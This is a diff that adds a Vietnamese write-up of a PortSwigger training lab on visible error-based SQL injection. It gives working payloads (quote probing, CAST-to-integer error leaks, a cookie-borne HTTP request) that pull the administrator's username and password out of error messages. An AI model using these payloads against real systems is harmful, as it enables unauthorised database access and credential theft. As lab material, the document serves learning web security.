@@ -649,6 +649,70 @@ xyz'||(SELECT CASE WHEN SUBSTR(password,$1$,1)='$a$' THEN TO_CHAR(1/0) ELSE '' E
 
 
 ### Lab: Visible error-based SQL injection
+> Mục tiêu: đăng nhập với tư cách `administrator`.
+
+Điều kiện như 2 câu trên nhưng xuất hiện lỗi có thể thấy được.
+
+#### Check type error
+Payload:
+```
+'
+```
+Khi thêm payload này, ta thấy lỗi của SQL
+```html
+Unterminated string literal started at position 36 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+
+Ta sử dụng payload `' OR 1=1--`, lỗi đã mất
+
+> Ý tưởng: giống [Lab: Blind SQL injection with conditional responses](https://waibui.github.io/posts/portswigger-lab-sql-injection/#lab-blind-sql-injection-with-conditional-responses) nhưng sử dụng `error` làm tín hiệu thay cho `Welcome back`.
+
+#### Exploit
+Payload:
+```
+' OR (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
+```
+
+Sẽ xảy ra lỗi vượt quá số lượng kí tự:
+
+```html
+Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = '' OR (SELECT 'a' FROM users WHERE username='administrator' A'. Expected char
+```
+
+> Ý tưởng: Ép kiểu để xảy ra lỗi, quẳng data cần tim ra error.
+
+Payload:
+```
+' OR 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+- Sử dụng `CAST(value AS type)` để ép kiểu
+- `username` ở dạng chuỗi (eg: `'administrator'`) nên ép kiểu sang `int` sẽ bị lỗi, làm quẳng lỗi với `username`
+- `LIMIT 1` đẻ giới hạn số lượng `row` thành 1 để không bị lỗi khi `merge`
+
+Kết quả:
+```html
+ERROR: invalid input syntax for type integer: "administrator"
+```
+Ta thấy được tên `username` là `administrator`
+
+Payload:
+```
+' OR 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+```
+
+Lấy `password` ở `row` đầu tiên tương ứng với administrator
+
+Lỗi được hiển thị
+```html
+ERROR: invalid input syntax for type integer: "iqkju3azwuccb85jbwxx"
+```
+
+Request:
+```http
+GET / HTTP/2
+Host: 0a1f00ff0326b398805ac15d005300b5.web-security-academy.net
+Cookie: TrackingId=' OR 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- ; session=ALCo58Xt5yYwqhazKher42ZSZN2kbDOn
+```
 
 
 ---
